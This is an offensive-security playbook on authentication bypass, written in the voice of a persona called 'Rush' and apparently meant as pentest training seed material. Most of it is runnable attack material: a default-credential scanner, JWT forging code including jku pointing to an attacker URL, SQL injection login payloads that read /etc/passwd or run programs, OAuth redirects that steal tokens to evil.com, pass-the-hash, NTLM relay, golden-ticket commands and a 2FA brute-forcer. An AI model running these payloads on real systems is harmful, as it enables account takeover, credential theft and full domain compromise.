# GS-29: Authentication Bypass Techniques — Breaking Every Gate

**Classification**: Rush (Royal Guard — The Breacher)
**Seed ID**: GS-29
**Domain**: Authentication Security / Offensive Testing
**Source**: OWASP Testing Guide v4.2, OWASP WSTG-ATHN, MITRE ATT&CK TA0001/TA0006

---

## 1. Authentication Attack Surface Map

```
┌─────────────────────────────────────────────────────────┐
│                AUTHENTICATION ATTACK SURFACE             │
├─────────────┬───────────────────────────────────────────┤
│ Layer       │ Attack Vectors                            │
├─────────────┼───────────────────────────────────────────┤
│ Credentials │ Default creds, brute force, credential    │
│             │ stuffing, password spraying                │
├─────────────┼───────────────────────────────────────────┤
│ Tokens      │ JWT manipulation, session fixation,       │
│             │ session hijacking, token replay            │
├─────────────┼───────────────────────────────────────────┤
│ OAuth/SSO   │ Open redirect, CSRF, token theft,         │
│             │ scope abuse, IdP confusion                 │
├─────────────┼───────────────────────────────────────────┤
│ Session     │ Prediction, brute force, fixation,        │
│             │ cookie theft, insufficient expiry          │
├─────────────┼───────────────────────────────────────────┤
│ Logic       │ SQLi auth bypass, race conditions,        │
│             │ parameter tampering, forced browsing       │
├─────────────┼───────────────────────────────────────────┤
│ Windows     │ Pass-the-hash, pass-the-ticket, Kerberos  │
│             │ roasting, relay attacks, token abuse       │
└─────────────┴───────────────────────────────────────────┘
```

---

## 2. Default Credentials

The simplest attack vector. Shockingly effective even in enterprise environments.

### Common Default Credential Databases

```bash
# SecLists — the gold standard
git clone https://github.com/danielmiessler/SecLists.git
ls SecLists/Passwords/Default-Credentials/

# Key files:
# default-passwords.csv              — Massive CSV of vendor defaults
# ftp-betterdefaultpasslist.txt      — FTP defaults
# ssh-betterdefaultpasslist.txt      — SSH defaults
# tomcat-betterdefaultpasslist.txt   — Tomcat manager defaults
# db_clients_default_passwords.csv   — Database defaults
```

### Top Targets for Default Credentials

| Service/Product | Common Defaults | Port |
|---|---|---|
| **Apache Tomcat** | tomcat:tomcat, admin:admin, manager:manager | 8080 |
| **Jenkins** | No auth by default, admin:admin | 8080 |
| **WordPress** | admin:admin, admin:password | 80/443 |
| **phpMyAdmin** | root:(empty), root:root | 80/443 |
| **Cisco devices** | cisco:cisco, admin:admin, enable:(blank) | 22/23 |
| **Fortinet** | admin:(empty), admin:fortinet | 443 |
| **SonicWall** | admin:password | 443 |
| **HP iLO** | Administrator:(on sticker) | 443 |
| **Dell iDRAC** | root:calvin | 443 |
| **VMware ESXi** | root:(set at install) | 443 |
| **PostgreSQL** | postgres:postgres | 5432 |
| **MySQL** | root:(empty) | 3306 |
| **MongoDB** | (no auth by default) | 27017 |
| **Redis** | (no auth by default) | 6379 |
| **Elasticsearch** | (no auth by default pre-8.x) | 9200 |
| **MSSQL** | sa:sa, sa:(empty) | 1433 |

### Automated Default Credential Scanning

```python
#!/usr/bin/env python3
"""Rush's default credential scanner for common web panels."""

import asyncio
import aiohttp
import json

# Target + credential pairs
TARGETS = [
    {
        "name": "Tomcat Manager",
        "url": "http://{host}:8080/manager/html",
        "method": "GET",
        "auth_type": "basic",
        "creds": [
            ("tomcat", "tomcat"),
            ("admin", "admin"),
            ("manager", "manager"),
            ("tomcat", "s3cret"),
            ("admin", ""),
        ],
        "success_indicator": "Tomcat Web Application Manager",
    },
    {
        "name": "Jenkins",
        "url": "http://{host}:8080/login",
        "method": "POST",
        "auth_type": "form",
        "form_data": {"j_username": "{user}", "j_password": "{pass}", "Submit": "Sign in"},
        "form_url": "http://{host}:8080/j_acme_security_check",
        "creds": [
            ("admin", "admin"),
            ("admin", "password"),
            ("admin", "jenkins"),
        ],
        "success_indicator": "Dashboard",
    },
]

async def try_basic_auth(session, url, username, password):
    """Try HTTP Basic authentication."""
    auth = aiohttp.BasicAuth(username, password)
    try:
        async with session.get(url, auth=auth, timeout=aiohttp.ClientTimeout(total=5), ssl=False) as resp:
            text = await resp.text()
            return resp.status, text
    except Exception as e:
        return 0, str(e)

async def try_form_auth(session, url, form_url, form_data, username, password):
    """Try form-based authentication."""
    data = {}
    for k, v in form_data.items():
        data[k] = v.replace("{user}", username).replace("{pass}", password)
    try:
        async with session.post(form_url, data=data, timeout=aiohttp.ClientTimeout(total=5),
                                ssl=False, allow_redirects=True) as resp:
            text = await resp.text()
            return resp.status, text
    except Exception as e:
        return 0, str(e)

async def scan_host(host: str):
    """Scan a single host for default credentials."""
    results = []
    async with aiohttp.ClientSession() as session:
        for target in TARGETS:
            url = target["url"].format(host=host)
            for username, password in target["creds"]:
                if target["auth_type"] == "basic":
                    status, body = await try_basic_auth(session, url, username, password)
                elif target["auth_type"] == "form":
                    form_url = target["form_url"].format(host=host)
                    status, body = await try_form_auth(
                        session, url, form_url, target["form_data"], username, password
                    )

                if target["success_indicator"] in body:
                    result = f"[+] {target['name']} @ {host} — {username}:{password}"
                    print(result)
                    results.append(result)
                    break  # Found valid creds, move to next target

    return results

async def main():
    hosts = ["10.10.10.100", "10.10.10.101"]  # Target hosts
    tasks = [scan_host(h) for h in hosts]
    await asyncio.gather(*tasks)

if __name__ == "__main__":
    asyncio.run(main())
```

---

## 3. JWT (JSON Web Token) Manipulation

### JWT Structure

```
eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.    <-- Header (base64url)
eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6InVzZXIifQ.  <-- Payload (base64url)
SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c      <-- Signature (base64url)
```

### Attack 1: Algorithm Confusion (RS256 → HS256)

If the server uses RS256 (asymmetric) but accepts HS256 (symmetric), you can sign tokens with the PUBLIC key as the HMAC secret.

```python
#!/usr/bin/env python3
"""JWT Algorithm Confusion Attack — RS256 to HS256."""

import base64
import hmac
import hashlib
import json

def b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

def b64url_decode(data: str) -> bytes:
    padding = 4 - len(data) % 4
    if padding != 4:
        data += '=' * padding
    return base64.urlsafe_b64decode(data)

def forge_jwt_alg_confusion(public_key_pem: str, payload: dict) -> str:
    """
    Forge a JWT using algorithm confusion.
    Server expects RS256 but we send HS256 signed with the public key.
    """
    # Header: change alg to HS256
    header = {"alg": "HS256", "typ": "JWT"}

    # Encode header and payload
    header_b64 = b64url_encode(json.dumps(header).encode())
    payload_b64 = b64url_encode(json.dumps(payload).encode())

    # Sign with public key as HMAC secret
    signing_input = f"{header_b64}.{payload_b64}".encode()

    # The public key PEM is used as the HMAC-SHA256 key
    # Some implementations need the raw key bytes, some need the full PEM
    signature = hmac.new(
        public_key_pem.encode(),
        signing_input,
        hashlib.sha256
    ).digest()

    sig_b64 = b64url_encode(signature)

    return f"{header_b64}.{payload_b64}.{sig_b64}"

# Usage
public_key = """-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA...
-----END PUBLIC KEY-----"""

forged_payload = {
    "sub": "1",
    "role": "admin",
    "iat": 1700000000,
    "exp": 1800000000
}

token = forge_jwt_alg_confusion(public_key, forged_payload)
print(f"Forged token: {token}")
```

### Attack 2: Algorithm "none"

If the server doesn't enforce algorithm validation, set `alg` to `none` and strip the signature.

```python
def forge_jwt_none(payload: dict) -> str:
    """Forge a JWT with algorithm 'none' — no signature needed."""
    # Try variations: none, None, NONE, nOnE
    header = {"alg": "none", "typ": "JWT"}

    header_b64 = b64url_encode(json.dumps(header).encode())
    payload_b64 = b64url_encode(json.dumps(payload).encode())

    # No signature — just trailing dot
    return f"{header_b64}.{payload_b64}."

# Variations that bypass naive checks
def forge_jwt_none_variants(payload: dict) -> list:
    variants = ["none", "None", "NONE", "nOnE", "NoNe"]
    tokens = []
    for alg in variants:
        header = {"alg": alg, "typ": "JWT"}
        h = b64url_encode(json.dumps(header).encode())
        p = b64url_encode(json.dumps(payload).encode())
        tokens.append(f"{h}.{p}.")
    return tokens
```

### Attack 3: Weak Signing Secret

```bash
# Crack JWT secret with hashcat
# Mode 16500 = JWT
hashcat -m 16500 -a 0 jwt_token.txt /usr/share/wordlists/rockyou.txt
hashcat -m 16500 -a 3 jwt_token.txt ?a?a?a?a?a?a  # Brute force up to 6 chars

# jwt_tool — Swiss army knife for JWT testing
python3 jwt_tool.py <token> -C -d /usr/share/wordlists/rockyou.txt  # Crack
python3 jwt_tool.py <token> -T                                       # Tamper mode
python3 jwt_tool.py <token> -X a                                     # Algorithm none
python3 jwt_tool.py <token> -X k -pk public.pem                     # Key confusion

# Common weak secrets to try manually
# secret, password, 123456, jwt_secret, changeme, key, HS256key
```

### Attack 4: JWK/JKU Header Injection

```python
def forge_jwt_jwk_injection(payload: dict, attacker_url: str) -> str:
    """
    Inject a JWK (JSON Web Key) into the JWT header.
    The server fetches the key from the token itself — attacker controls the key.
    """
    from cryptography.hazmat.primitives.asymmetric import rsa
    from cryptography.hazmat.primitives import serialization
    import jwt as pyjwt

    # Generate attacker's RSA key
    private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    public_key = private_key.public_key()

    # Get public key numbers for JWK
    pub_numbers = public_key.public_numbers()
    n = b64url_encode(pub_numbers.n.to_bytes(256, byteorder='big'))
    e = b64url_encode(pub_numbers.e.to_bytes(3, byteorder='big'))

    # Build JWK embedded in header
    jwk = {
        "kty": "RSA",
        "n": n,
        "e": e,
        "use": "sig"
    }

    # Method 1: Embed JWK directly in header
    header = {
        "alg": "RS256",
        "typ": "JWT",
        "jwk": jwk
    }

    # Method 2: Point to attacker-hosted JWKS via jku
    # header = {"alg": "RS256", "typ": "JWT", "jku": f"{attacker_url}/.well-known/jwks.json"}

    # Sign with our private key
    token = pyjwt.encode(payload, private_key, algorithm="RS256", headers=header)
    return token
```

---

## 4. OAuth Abuse

### Open Redirect Token Theft

```
Legitimate OAuth flow:
1. App redirects to: https://auth.server/authorize?response_type=code&client_id=X&redirect_uri=https://app.com/callback
2. User authenticates
3. Auth server redirects to: https://app.com/callback?code=AUTH_CODE
4. App exchanges code for token

Attack: If redirect_uri validation is weak:
https://auth.server/authorize?response_type=token&client_id=X&redirect_uri=https://app.com.evil.com/steal
https://auth.server/authorize?response_type=token&client_id=X&redirect_uri=https://app.com/callback/../../../evil
https://auth.server/authorize?response_type=token&client_id=X&redirect_uri=https://app.com/callback%23@evil.com
```

### OAuth Scope Escalation

```bash
# Request more scopes than the app normally asks for
# If the auth server doesn't enforce allowed scopes per client:
GET /authorize?response_type=code&client_id=web_app&scope=openid+profile+admin+write:all&redirect_uri=...

# PKCE bypass — if the server doesn't enforce PKCE:
# 1. Intercept the authorization code
# 2. Exchange it without code_verifier
```

### OAuth CSRF (Missing state Parameter)

```python
# If the OAuth flow doesn't use the 'state' parameter:
# 1. Attacker initiates OAuth flow with their own account
# 2. Captures the callback URL with auth code (before it's consumed)
# 3. Sends the callback URL to the victim
# 4. Victim's session is now linked to attacker's OAuth account

# Detection: Check if state parameter is present and validated
# Exploitation: Simple — just send the crafted callback URL
```

---

## 5. Session Attacks

### Session Fixation

```python
# Attack flow:
# 1. Attacker gets a valid session ID from the server (unauthenticated)
# 2. Attacker tricks victim into using that session ID
# 3. Victim authenticates — the session ID is now authenticated
# 4. Attacker uses the same session ID — they're now authenticated as the victim

# Fixation via URL parameter
# http://vulnerable.com/login?JSESSIONID=attacker_controlled_session_id

# Fixation via Set-Cookie (if attacker controls a subdomain)
# Set-Cookie: session=attacker_controlled; Domain=.vulnerable.com; Path=/

# Defense: Regenerate session ID after authentication
# Test: Note session ID before login, check if it changes after login
```

### Session Prediction

```python
#!/usr/bin/env python3
"""Analyze session token entropy and predictability."""

import collections
import math
import requests

def collect_sessions(url: str, count: int = 100) -> list:
    """Collect session tokens from a target."""
    sessions = []
    for _ in range(count):
        resp = requests.get(url, allow_redirects=False)
        cookies = resp.cookies
        for cookie in cookies:
            if cookie.name.lower() in ('session', 'sessionid', 'jsessionid', 'phpsessid', 'sid'):
                sessions.append(cookie.value)
    return sessions

def analyze_entropy(tokens: list):
    """Calculate Shannon entropy of session tokens."""
    all_chars = ''.join(tokens)
    freq = collections.Counter(all_chars)
    total = len(all_chars)

    entropy = -sum((count/total) * math.log2(count/total) for count in freq.values())

    print(f"Tokens collected: {len(tokens)}")
    print(f"Average length: {sum(len(t) for t in tokens) / len(tokens):.0f}")
    print(f"Character entropy: {entropy:.2f} bits/char")
    print(f"Unique chars: {len(freq)}")

    # Check for sequential patterns
    if len(tokens) >= 2:
        try:
            nums = [int(t, 16) for t in tokens]
            diffs = [nums[i+1] - nums[i] for i in range(len(nums)-1)]
            if len(set(diffs)) < len(diffs) * 0.3:  # Low diversity in differences
                print("[!] WARNING: Tokens appear sequential — predictable!")
                print(f"    Common difference: {collections.Counter(diffs).most_common(1)}")
        except ValueError:
            pass

    if entropy < 4.0:
        print("[!] LOW ENTROPY — tokens may be predictable")
    elif entropy < 5.0:
        print("[*] MODERATE ENTROPY — investigate further")
    else:
        print("[+] Entropy appears reasonable")

# Usage
# tokens = collect_sessions("http://vulnerable.com/login")
# analyze_entropy(tokens)
```

---

## 6. SQL Injection Authentication Bypass

### Classic SQLi Auth Bypass Payloads

```sql
-- Username field injections (password can be anything)
' OR 1=1--
' OR 1=1#
' OR 1=1/*
admin'--
admin' #
admin'/*
' OR '1'='1'--
' OR '1'='1'/*
') OR ('1'='1'--
') OR ('1'='1'/*

-- Login as specific user
admin' AND 1=1--
admin')--

-- Union-based (if error messages visible)
' UNION SELECT 1,'admin','password_hash'--

-- Time-based blind (confirm injection exists)
admin' AND SLEEP(5)--
admin' AND pg_sleep(5)--
admin'; WAITFOR DELAY '0:0:5'--

-- Second-order SQLi (payload stored, executed later)
-- Register username: admin'--
-- On next login or profile view, the stored payload executes
```

### PostgreSQL-Specific Auth Bypass

```sql
-- PostgreSQL uses different comment syntax
' OR 1=1--
' OR 1=1;--
admin';--

-- Stacked queries (PostgreSQL supports them)
'; CREATE TABLE rush_was_here(data text);--
'; COPY rush_was_here FROM '/etc/passwd';--

-- Read files via COPY
'; COPY (SELECT '') TO PROGRAM 'id > /tmp/out';--
```

### Automated SQLi Auth Testing

```bash
# sqlmap against login form
sqlmap -u "http://target.com/login" --data="username=admin&password=test" --level=5 --risk=3 --dbms=postgresql

# Specify the parameter to test
sqlmap -u "http://target.com/login" --data="username=admin&password=test" -p username --technique=B

# With cookies/headers if needed
sqlmap -u "http://target.com/login" --data="username=admin&password=test" --cookie="session=abc123" --headers="X-Custom: value"
```

---

## 7. Windows Authentication Attacks (Impacket Suite)

### Pass-the-Hash (PtH)

Use a captured NTLM hash to authenticate without knowing the password.

```bash
# Impacket psexec — get SYSTEM shell via PtH
python3 psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 administrator@10.10.10.100

# Impacket wmiexec — stealthier, uses WMI
python3 wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 administrator@10.10.10.100

# Impacket smbexec — uses service creation
python3 smbexec.py -hashes aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 administrator@10.10.10.100

# Impacket atexec — uses scheduled tasks
python3 atexec.py -hashes aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 administrator@10.10.10.100 "whoami"

# Evil-WinRM PtH
evil-winrm -i 10.10.10.100 -u administrator -H '31d6cfe0d16ae931b73c59d7e0c089c0'

# CrackMapExec PtH (mass spray)
crackmapexec smb 10.10.10.0/24 -u administrator -H '31d6cfe0d16ae931b73c59d7e0c089c0' --exec-method smbexec -x "whoami"
```

### Pass-the-Ticket (PtT)

Use a captured Kerberos ticket (TGT or TGS) to authenticate.

```bash
# Export tickets from a compromised Windows host
mimikatz # sekurlsa::tickets /export

# Or dump from memory
mimikatz # sekurlsa::logonpasswords

# Convert ticket format (kirbi → ccache for Linux tools)
python3 ticketConverter.py admin.kirbi admin.ccache

# Use the ticket with Impacket
export KRB5CCNAME=admin.ccache
python3 psexec.py -k -no-pass domain.com/administrator@dc01.domain.com
python3 wmiexec.py -k -no-pass domain.com/administrator@dc01.domain.com

# Rubeus — request and use tickets on Windows
Rubeus.exe asktgt /user:administrator /rc4:31d6cfe0d16ae931b73c59d7e0c089c0 /ptt
Rubeus.exe asktgt /user:administrator /aes256:<aes_key> /ptt
```

### Kerberoasting

Request service tickets for accounts with SPNs, then crack them offline.

```bash
# Impacket GetUserSPNs — request TGS tickets
python3 GetUserSPNs.py domain.com/user:'Password123' -dc-ip 10.10.10.1 -request -outputfile kerberoast.txt

# Rubeus (from Windows)
Rubeus.exe kerberoast /outfile:kerberoast.txt

# Crack with hashcat (mode 13100 = Kerberos 5 TGS-REP etype 23)
hashcat -m 13100 -a 0 kerberoast.txt /usr/share/wordlists/rockyou.txt

# Crack with john
john --wordlist=/usr/share/wordlists/rockyou.txt kerberoast.txt
```

### AS-REP Roasting

Target accounts with "Do not require Kerberos preauthentication" enabled.

```bash
# Impacket GetNPUsers — find and request AS-REP for vulnerable accounts
python3 GetNPUsers.py domain.com/ -dc-ip 10.10.10.1 -usersfile users.txt -format hashcat -outputfile asrep.txt

# Without valid creds (if you have a user list)
python3 GetNPUsers.py domain.com/ -dc-ip 10.10.10.1 -no-pass -usersfile users.txt

# Crack with hashcat (mode 18200 = Kerberos 5 AS-REP etype 23)
hashcat -m 18200 -a 0 asrep.txt /usr/share/wordlists/rockyou.txt
```

### NTLM Relay Attacks

```bash
# Capture NTLM authentication and relay to another target
# Step 1: Disable SMB in Responder (we want ntlmrelayx to handle it)
# Edit /etc/responder/Responder.conf: SMB = Off, HTTP = Off

# Step 2: Start ntlmrelayx targeting specific hosts
python3 ntlmrelayx.py -tf targets.txt -smb2support

# Step 3: Start Responder to capture credentials
responder -I eth0 -rdw

# Step 4: When a victim authenticates, ntlmrelayx forwards the auth
# With command execution:
python3 ntlmrelayx.py -tf targets.txt -smb2support -c "whoami > C:\temp\pwned.txt"

# With SAM dump:
python3 ntlmrelayx.py -tf targets.txt -smb2support --dump-sam

# LDAP relay (for privilege escalation via delegation)
python3 ntlmrelayx.py -t ldap://dc01.domain.com --escalate-user lowpriv
```

### Silver Ticket

Forge a TGS for any service if you have the service account's hash.

```bash
# Using Impacket ticketer
python3 ticketer.py -nthash <service_account_hash> -domain-sid S-1-5-21-XXXXXXXXXX -domain domain.com -spn MSSQLSvc/sql01.domain.com:1433 administrator

# Using Mimikatz
mimikatz # kerberos::golden /user:administrator /domain:domain.com /sid:S-1-5-21-XXX /target:sql01.domain.com /service:MSSQLSvc /rc4:<hash> /ptt
```

### Golden Ticket

Forge a TGT if you have the KRBTGT hash — complete domain dominance.

```bash
# Impacket ticketer
python3 ticketer.py -nthash <krbtgt_hash> -domain-sid S-1-5-21-XXXXXXXXXX -domain domain.com administrator
export KRB5CCNAME=administrator.ccache
python3 psexec.py -k -no-pass domain.com/administrator@dc01.domain.com

# Mimikatz
mimikatz # kerberos::golden /user:administrator /domain:domain.com /sid:S-1-5-21-XXX /krbtgt:<hash> /ptt
```

---

## 8. Two-Factor Authentication Bypass

### Common 2FA Weaknesses

```
1. Response manipulation — Change server response from "2fa_required" to "success"
2. Direct page access — Navigate directly to post-auth page, bypassing 2FA check
3. Code reuse — Same code works multiple times (no single-use enforcement)
4. Brute force — 4-6 digit codes with no rate limiting = feasible
5. Backup codes — Often weaker, stored insecurely, never rotated
6. Race condition — Submit multiple 2FA attempts simultaneously
7. Session riding — If session is granted before 2FA, it may be usable
8. Token in response — Some implementations return the 2FA code in the API response
```

### 2FA Brute Force (When Rate Limiting Is Absent)

```python
#!/usr/bin/env python3
"""2FA code brute-forcer for 4-6 digit OTP without rate limiting."""

import asyncio
import aiohttp

async def try_code(session, url, code, cookies, semaphore):
    async with semaphore:
        data = {"otp": code}
        try:
            async with session.post(url, data=data, cookies=cookies,
                                     timeout=aiohttp.ClientTimeout(total=5)) as resp:
                text = await resp.text()
                if "invalid" not in text.lower() and resp.status == 200:
                    print(f"[+] VALID CODE: {code}")
                    return code
        except:
            pass
    return None

async def brute_2fa(url: str, cookies: dict, digits: int = 6, concurrency: int = 50):
    semaphore = asyncio.Semaphore(concurrency)
    max_code = 10 ** digits

    async with aiohttp.ClientSession() as session:
        tasks = []
        for i in range(max_code):
            code = str(i).zfill(digits)
            tasks.append(try_code(session, url, code, cookies, semaphore))

        results = await asyncio.gather(*tasks)
        valid = [r for r in results if r is not None]
        return valid

# asyncio.run(brute_2fa("http://target/verify-2fa", {"session": "abc123"}, digits=4))
```

---

## 9. Password Reset Flow Attacks

```
1. Host header injection — Reset link points to attacker's domain
   Host: evil.com → reset link: https://evil.com/reset?token=xxx

2. Token in referrer — After clicking reset link, token leaks via Referer header
   if the reset page loads external resources

3. Weak token generation — Predictable tokens (timestamp-based, sequential)

4. Token reuse — Token not invalidated after use

5. No token expiry — Reset tokens valid indefinitely

6. Parameter pollution — email=victim@target.com&email=attacker@evil.com
   Some systems send to both addresses
```

---

## 10. Rush's Tactical Notes

1. **Start with defaults, always.** Before you write a single exploit, check default credentials. You'd be amazed how often admin:admin works on a $50M infrastructure.

2. **JWT attacks are everywhere.** Modern apps love JWTs. Most developers grab a library and set `secret: "secret"`. Test `none` algorithm, test weak secrets with hashcat mode 16500, test key confusion. Three tests, five minutes, high hit rate.

3. **Impacket is your Swiss Army knife for Windows.** PtH with psexec, PtT with converted tickets, Kerberoasting with GetUserSPNs. Every Windows pentest starts and ends with Impacket.

4. **SQLi auth bypass still works in 2026.** Legacy apps, internal tools, custom CMS platforms — they don't get patched. `' OR 1=1--` in the username field is still a valid first check.

5. **Always test the session, not just the login.** Authentication doesn't end at the login page. Test session tokens, test direct page access, test API endpoints without auth headers. The gate might be strong but the fence has holes.

6. **Never solve only the problem in front of you.** If one service has default credentials, EVERY service on that network probably has weak auth. If one JWT uses a weak secret, check every microservice. Think every version of the problem.

---

*Rush doesn't bypass authentication. Rush proves it was never there.*
